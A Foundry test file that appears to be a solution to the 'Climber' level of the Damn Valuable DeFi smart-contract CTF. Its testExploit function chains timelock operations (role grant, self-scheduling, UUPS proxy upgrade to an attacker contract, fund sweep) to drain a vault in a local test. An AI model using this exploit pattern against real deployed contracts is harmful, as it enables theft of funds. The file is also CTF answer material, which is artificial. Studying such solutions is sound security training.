// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "openzeppelin-contracts/proxy/ERC1967/ERC1967Proxy.sol";
import "forge-std/Test.sol";

import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
import {ClimberTimelock} from "../../../src/Contracts/climber/ClimberTimelock.sol";
import {ClimberVault} from "../../../src/Contracts/climber/ClimberVault.sol";
import {AttackerContract} from "../../../src/Contracts/climber/solution/AttackContract.sol";
import {UUPSUpgradeable} from "openzeppelin-contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import {AccessControl} from "openzeppelin-contracts/access/AccessControl.sol";

contract Climber is Test {
    uint256 internal constant VAULT_TOKEN_BALANCE = 10_000_000e18;

    Utilities internal utils;
    DamnValuableToken internal dvt;
    ClimberTimelock internal climberTimelock;
    ClimberVault internal climberImplementation;
    ERC1967Proxy internal climberVaultProxy;
    address[] internal users;
    address payable internal deployer;
    address payable internal proposer;
    address payable internal sweeper;
    address payable internal attacker;

    function setUp() public {
        /**
         * SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE
         */

        utils = new Utilities();
        users = utils.createUsers(3);

        deployer = payable(users[0]);
        proposer = payable(users[1]);
        sweeper = payable(users[2]);

        attacker = payable(address(uint160(uint256(keccak256(abi.encodePacked("attacker"))))));
        vm.label(attacker, "Attacker");
        vm.deal(attacker, 0.1 ether);

        // Deploy the vault behind a proxy using the UUPS pattern,
        // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
        climberImplementation = new ClimberVault();
        vm.label(address(climberImplementation), "climber Implementation");

        bytes memory data = abi.encodeWithSignature("initialize(address,address,address)", deployer, proposer, sweeper);
        climberVaultProxy = new ERC1967Proxy(
            address(climberImplementation),
            data
        );

        assertEq(ClimberVault(address(climberVaultProxy)).getSweeper(), sweeper);

        assertGt(ClimberVault(address(climberVaultProxy)).getLastWithdrawalTimestamp(), 0);

        climberTimelock = ClimberTimelock(payable(ClimberVault(address(climberVaultProxy)).owner()));

        assertTrue(climberTimelock.hasRole(climberTimelock.PROPOSER_ROLE(), proposer));

        assertTrue(climberTimelock.hasRole(climberTimelock.ADMIN_ROLE(), deployer));

        // Deploy token and transfer initial token balance to the vault
        dvt = new DamnValuableToken();
        vm.label(address(dvt), "DVT");
        dvt.transfer(address(climberVaultProxy), VAULT_TOKEN_BALANCE);

        console.log(unicode"🧨 Let's see if you can break it... 🧨");
    }

    function testExploit() public {
        /**
         * EXPLOIT START *
         */

        vm.startPrank(attacker);
        AttackerContract attackerContract =
            new AttackerContract(address(dvt), address(climberVaultProxy), address(climberTimelock));

        bytes32 salt = bytes32(uint256(uint160(address(attacker))));

        bytes32 PROPOSER_ROLE = keccak256("PROPOSER_ROLE");

        // Example input values
        address[] memory targets = new address[](4);
        uint256[] memory values = new uint256[](4);
        bytes[] memory dataElements = new bytes[](4);

        targets[0] = address(climberTimelock);
        values[0] = 0;
        dataElements[0] =
            abi.encodeWithSelector(AccessControl.grantRole.selector, PROPOSER_ROLE, address(attackerContract));

        values[2] = 0;
        targets[2] = address(climberVaultProxy);
        dataElements[2] = abi.encodeWithSelector(UUPSUpgradeable.upgradeTo.selector, address(attackerContract));
        values[3] = 0;
        targets[3] = address(climberVaultProxy);
        dataElements[3] = abi.encodeWithSelector(AttackerContract.sweepFund.selector, address(dvt), address(attacker));
        values[1] = 0;
        targets[1] = address(attackerContract);
        dataElements[1] = abi.encodeWithSignature(
            "schedule(address[],uint256[],bytes[],bytes32)", targets, values, dataElements, salt
        );
        console.log("Climbertimelock address", address(climberTimelock));
        console.log("ClimberVaultProxy address", address(climberVaultProxy));
        console.log("AttackerContract address", address(attackerContract));

        attackerContract.attack(targets, values, dataElements, salt);

        //1. call the execute function of the timelock contract

        vm.stopPrank();

        /**
         * EXPLOIT END *
         */
        validation();
        console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
    }

    function validation() internal {
        /**
         * SUCCESS CONDITIONS
         */
        assertEq(dvt.balanceOf(attacker), VAULT_TOKEN_BALANCE);
        assertEq(dvt.balanceOf(address(climberVaultProxy)), 0);
    }
}
